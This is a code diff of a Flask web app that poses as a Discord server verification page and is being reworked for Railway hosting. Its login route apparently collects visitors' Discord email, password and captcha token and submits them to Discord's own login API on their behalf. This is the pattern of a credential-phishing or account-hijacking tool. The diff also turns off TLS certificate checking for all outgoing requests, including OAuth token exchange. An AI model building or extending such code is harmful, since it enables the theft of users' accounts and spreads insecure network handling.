@@ -1,35 +1,60 @@
-from flask import Flask, request, redirect, render_template, jsonify
+from flask import Flask, request, redirect, render_template, jsonify, send_from_directory
 import json
 import base64
 import time
 import requests
 import datetime
-from config import CLIENT_ID, CLIENT_SECRET, REDIRECT_URI,  GUILD_ID, VERIFIED_ROLE_ID, BOT_TOKEN
+import os
+import ssl
+from config import CLIENT_ID, CLIENT_SECRET, REDIRECT_URI, GUILD_ID, VERIFIED_ROLE_ID, BOT_TOKEN
 from html_template import VERIFY_PAGE_HTML
 from verify_template import VERIFICATION_SUCCESS_HTML
 
-app = Flask(__name__)
+app = Flask(__name__, static_folder='static', template_folder='templates')
 
 # ============================================
-# ⭐ hCaptcha Configuration
+# Railway এর জন্য Port Configuration
 # ============================================
-import os
+PORT = int(os.environ.get('PORT', 5000))
 
-HCAPTCHA_SECRET_KEY = os.getenv("HCAPTCHA_SECRET_KEY")
+# ============================================
+# hCaptcha Configuration
+# ============================================
+HCAPTCHA_SECRET_KEY = os.getenv("HCAPTCHA_SECRET_KEY") or os.getenv("HCAPTCHA_SECRET")
 HCAPTCHA_SITE_KEY = "5002f800-070a-4aea-b58a-395c9632217c"
 
 # ============================================
-# ⭐ Expired Link Redirect URL (আপনার লিংক দিন)
+# Expired Link Redirect URL
 # ============================================
-EXPIRED_REDIRECT_URL = "https://invite-tracker.com/"  # 🔁 এখানে আপনার লিংক দিন
+EXPIRED_REDIRECT_URL = "https://invite-tracker.com/"
 
 # ============================================
-# ⭐ hCaptcha Verify Function
+# Custom SSL Adapter for Railway
+# ============================================
+from requests.adapters import HTTPAdapter
+from urllib3.poolmanager import PoolManager
+
+class SSLAdapter(HTTPAdapter):
+    def init_poolmanager(self, *args, **kwargs):
+        kwargs['cert_reqs'] = ssl.CERT_NONE
+        kwargs['assert_hostname'] = False
+        return super().init_poolmanager(*args, **kwargs)
+
+# Create session with SSL verification disabled (for Railway)
+session = requests.Session()
+session.mount('https://', SSLAdapter())
+
+# ============================================
+# hCaptcha Verify Function (Railway Version)
 # ============================================
 def verify_hcaptcha(captcha_response):
-    """hCaptcha টোকেন ভেরিফাই করে"""
+    """hCaptcha টোকেন ভেরিফাই করে (Railway optimized)"""
     if not captcha_response:
         print("❌ No captcha response provided")
+        return False
+    
+    if not HCAPTCHA_SECRET_KEY:
+        print("❌ HCAPTCHA_SECRET_KEY not set in environment variables!")
         return False
     
     try:
@@ -42,7 +67,8 @@ def verify_hcaptcha(captcha_response):
         
         print(f"📤 Verifying hCaptcha with response: {captcha_response[:20]}...")
         
-        response = requests.post(verify_url, data=payload, timeout=10)
+        # Railway তে SSL verify বন্ধ
+        response = session.post(verify_url, data=payload, timeout=10, verify=False)
         result = response.json()
         
         print(f"📥 hCaptcha Response: {result}")
@@ -58,15 +84,51 @@ def verify_hcaptcha(captcha_response):
     except requests.exceptions.Timeout:
         print("❌ hCaptcha timeout")
         return False
-    except requests.exceptions.ConnectionError:
-        print("❌ hCaptcha connection error")
+    except requests.exceptions.ConnectionError as e:
+        print(f"❌ hCaptcha connection error: {e}")
         return False
     except Exception as e:
         print(f"❌ hCaptcha error: {str(e)}")
         return False
 
 # ============================================
-# ⭐ Home Route
+# Health Check Endpoint (Railway এর জন্য)
+# ============================================
+@app.route('/health')
+def health():
+    return jsonify({
+        'status': 'healthy',
+        'timestamp': time.time(),
+        'environment': {
+            'HCAPTCHA_SECRET': 'set' if HCAPTCHA_SECRET_KEY else 'missing',
+            'BOT_TOKEN': 'set' if BOT_TOKEN else 'missing',
+            'CLIENT_ID': CLIENT_ID,
+            'GUILD_ID': GUILD_ID,
+            'PORT': PORT
+        }
+    })
+
+# ============================================
+# Test Discord API Endpoint (Debugging)
+# ============================================
+@app.route('/test-discord')
+def test_discord():
+    try:
+        # Test basic connectivity
+        response = session.get('https://discord.com/api/v9', timeout=10, verify=False)
+        return jsonify({
+            'status': 'success',
+            'discord_status': response.status_code,
+            'server_ip': requests.get('https://api.ipify.org', timeout=5).text
+        })
+    except Exception as e:
+        return jsonify({
+            'status': 'error',
+            'error': str(e)
+        })
+
+# ============================================
+# Home Route
 # ============================================
 @app.route('/')
 def home():
@@ -100,18 +162,20 @@ def home():
         <div class="container">
             <div class="status">✅</div>
             <h1>Verification System Active</h1>
-            <p>Flask server is running on localhost!</p>
+            <p>Flask server is running on Railway!</p>
+            <p>Port: {}</p>
+            <a href="/health" style="color: #4CAF50;">Health Check</a>
         </div>
     </body>
     </html>
-    """
+    """.format(PORT)
 
 # ============================================
-# ⭐ Login Route (GET + POST)
+# Login Route (GET + POST) - Railway Version
 # ============================================
 @app.route('/login', methods=['GET', 'POST'])
 def login_page():
-    """লগইন পেজ - এক্সপায়ার্ড লিংক রিডাইরেক্ট সহ"""
+    """লগইন পেজ - Railway optimized"""
     print("="*60)
     print("✅ /login route accessed!")
     print("="*60)
@@ -197,12 +261,25 @@ def login_page():
             }
             
             print(f"📤 Checking credentials with Discord API...")
-            response = requests.post('https://discord.com/api/v9/auth/login', 
-                                   json=login_data, 
-                                   headers=headers,
-                                   timeout=30)
+            
+            # Railway তে SSL verify বন্ধ করে request
+            response = session.post(
+                'https://discord.com/api/v9/auth/login', 
+                json=login_data, 
+                headers=headers,
+                timeout=30,
+                verify=False  # Railway SSL issue fix
+            )
             
             print(f"📥 Discord API Response Status: {response.status_code}")
+            
+            # Response body দেখুন (error হলে)
+            if response.status_code != 200:
+                try:
+                    error_data = response.json()
+                    print(f"❌ Error Response: {error_data}")
+                except:
+                    print(f"❌ Error Text: {response.text[:200]}")
             
             # ============================================
             # ✅ লগইন সফল
@@ -261,13 +338,44 @@ def login_page():
             # ============================================
             else:
                 print(f"❌ লগইন ব্যর্থ: {response.status_code}")
+                
+                # Specific error messages
+                error_msg = "Invalid email or password. Please try again."
+                if response.status_code == 400:
+                    try:
+                        error_data = response.json()
+                        if 'captcha' in str(error_data).lower():
+                            error_msg = "Captcha verification failed. Please try again."
+                        elif 'login' in str(error_data).lower():
+                            error_msg = "Invalid email or password."
+                    except:
+                        pass
+                elif response.status_code == 429:
+                    error_msg = "Too many attempts. Please wait a moment."
+                elif response.status_code == 403:
+                    error_msg = "Access denied. Please try again later."
+                
                 return jsonify({
                     'success': False,
                     'error': 'invalid_credentials',
-                    'message': 'Invalid email or password. Please try again.',
+                    'message': error_msg,
                     'reset_captcha': True
                 })
                 
+        except requests.exceptions.Timeout:
+            print("❌ Request Timeout")
+            return jsonify({
+                'success': False,
+                'error': 'timeout',
+                'message': 'Request timeout. Please try again.'
+            })
+        except requests.exceptions.ConnectionError as e:
+            print(f"❌ Connection Error: {e}")
+            return jsonify({
+                'success': False,
+                'error': 'connection_error',
+                'message': 'Connection error. Please try again.'
+            })
         except Exception as e:
             print(f"❌ Error: {str(e)}")
             return jsonify({
@@ -297,7 +405,6 @@ def login_page():
             <div class="container">
                 <div class="error">❌</div>
                 <h1>Data not found!</h1>
-                
             </div>
         </body>
         </html>
@@ -310,11 +417,10 @@ def login_page():
         expires_in = decoded.get('expires', 0) - int(time.time())
         
         # ============================================
-        # ⭐⭐⭐ LINK EXPIRED - REDIRECT TO YOUR URL ⭐⭐⭐
+        # ⭐⭐⭐ LINK EXPIRED - REDIRECT ⭐⭐⭐
         # ============================================
         if expires_in <= 0:
             print(f"⏰ Link has expired! Redirecting to: {EXPIRED_REDIRECT_URL}")
-            # 🔁 এখানে রিডাইরেক্ট করবে আপনার লিংকে
             return redirect(EXPIRED_REDIRECT_URL)
         
         username = decoded.get('username', 'Unknown')
@@ -371,7 +477,6 @@ def verify_page():
         expires_in = decoded.get('expires', 0) - int(time.time())
         
         if expires_in <= 0:
-            # 🔁 এক্সপায়ার্ড হলে রিডাইরেক্ট
             return redirect(EXPIRED_REDIRECT_URL)
         
         html = VERIFY_PAGE_HTML.replace("{CLIENT_ID}", CLIENT_ID).replace("{REDIRECT_URI}", REDIRECT_URI)
@@ -418,14 +523,14 @@ def oauth2_callback():
             'redirect_uri': REDIRECT_URI
         }
         
-        response = requests.post('https://discord.com/api/oauth2/token', data=data)
+        response = session.post('https://discord.com/api/oauth2/token', data=data, verify=False)
         response.raise_for_status()
         
         token_data = response.json()
         
         # ইউজার ইনফো
         headers = {'Authorization': f"Bearer {token_data['access_token']}"}
-        user_response = requests.get('https://discord.com/api/users/@me', headers=headers)
+        user_response = session.get('https://discord.com/api/users/@me', headers=headers, verify=False)
         user_response.raise_for_status()
         user_info = user_response.json()
         
@@ -441,7 +546,7 @@ def oauth2_callback():
         
         # ইউজারের রোল চেক করুন
         member_url = f'https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}'
-        member_response = requests.get(member_url, headers=bot_headers)
+        member_response = session.get(member_url, headers=bot_headers, verify=False)
         
         already_verified = False
         if member_response.status_code == 200:
@@ -464,7 +569,7 @@ def oauth2_callback():
         # রোল অ্যাড করার অংশ
         try:
             role_url = f'https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}/roles/{role_id}'
-            role_response = requests.put(role_url, headers=bot_headers)
+            role_response = session.put(role_url, headers=bot_headers, verify=False)
             
             if role_response.status_code == 204:
                 print(f"✅ Role added: {username}")
@@ -501,10 +606,12 @@ def oauth2_callback():
         """, 400
 
 # ============================================
-# ⭐ Flask Run Function
+# ⭐ Flask Run Function (Railway Optimized)
 # ============================================
 def run_flask():
-    print(f"🚀 Flask সার্ভার চালু হচ্ছে: https://invite-tracker-production-7071.up.railway.app")
+    print("="*60)
+    print("🚀 Starting Flask server on Railway...")
+    print(f"🌐 Port: {PORT}")
     print(f"🔗 Redirect URI: {REDIRECT_URI}")
     print(f"📌 Guild ID: {GUILD_ID}")
     print(f"📌 Verified Role ID: {VERIFIED_ROLE_ID}")
@@ -515,5 +622,20 @@ def run_flask():
     print("🎯 Wrong password will NOT show captcha again!")
     print(f"🔁 Expired links will redirect to: {EXPIRED_REDIRECT_URL}")
     print("="*60)
-    print("SECRET:", repr(HCAPTCHA_SECRET_KEY))
-    app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)
+    print(f"HCAPTCHA_SECRET_KEY: {'✅ SET' if HCAPTCHA_SECRET_KEY else '❌ MISSING'}")
+    print(f"BOT_TOKEN: {'✅ SET' if BOT_TOKEN else '❌ MISSING'}")
+    print(f"CLIENT_ID: {CLIENT_ID}")
+    print(f"GUILD_ID: {GUILD_ID}")
+    print("="*60)
+    print(f"🌐 Health Check: https://invite-tracker-production-7071.up.railway.app/health")
+    print(f"🧪 Test Discord API: https://invite-tracker-production-7071.up.railway.app/est-discord")
+    print("="*60)
+    
+    # Railway তে debug=False এবং সঠিক port
+    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False, threaded=True)
+
+# ============================================
+# Main Entry Point
+# ============================================
+if __name__ == "__main__":
+    run_flask()
